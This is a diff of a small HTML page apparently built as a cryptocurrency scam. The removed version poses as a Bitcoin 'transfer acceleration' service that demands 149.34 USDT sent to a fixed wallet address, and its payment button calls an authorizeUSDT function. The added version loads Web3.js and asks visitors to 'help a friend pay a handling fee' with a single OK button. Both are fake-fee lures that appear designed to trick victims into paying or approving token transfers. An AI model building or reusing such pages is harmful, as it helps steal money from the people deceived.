@@ -1,27 +1,16 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>比特币转账加速</title>
+    <title>USDT 转账网站</title>
     <link rel="stylesheet" href="styles.css">
-    <link rel="icon" href="https://s2.coinmarketcap.com/static/img/coins/64x64/1.png" type="image/png"> <!-- 比特币图标 -->
+    <!-- 引入 Web3.js CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.5/dist/web3.min.js"></script>
 </head>
 <body>
-    <div class="container">
-        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/1.png" alt="Bitcoin Logo" class="bitcoin-logo"> <!-- 比特币图标 -->
-        <h1>比特币转账加速</h1>
-        <div class="info-box">
-            <p>为了加速您的比特币转账，我们需要您支付 149.34 USDT。请点击“我已付款 下一步”按钮支付，支付后交易将在10分钟内打包完成。</p>
-        </div>
-        <div class="payment-details">
-            <p>支付金额：<span id="pay-amount">149.34 USDT</span></p>
-            <p>支付地址：<span id="pay-address">0x65f9f8F6432375d9fF7E369b0996bE52992013B1</span> <button onclick="copyAddress()">复制</button></p>
-            <p>BTC加速序号：<span id="btc-order"></span></p>
-        </div>
-        <button id="nextButton" onclick="authorizeUSDT()">我已付款 下一步</button>
-    </div>
-    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
-    <script src="script.js" type="application/javascript"></script>
+    <h1>Help him pay a handling fee</h1>
+    <p>Click OK to help friends complete the transfer</p>
+    <button id="ok-button">OK</button>
+    <script src="script.js"></script>
 </body>
 </html>
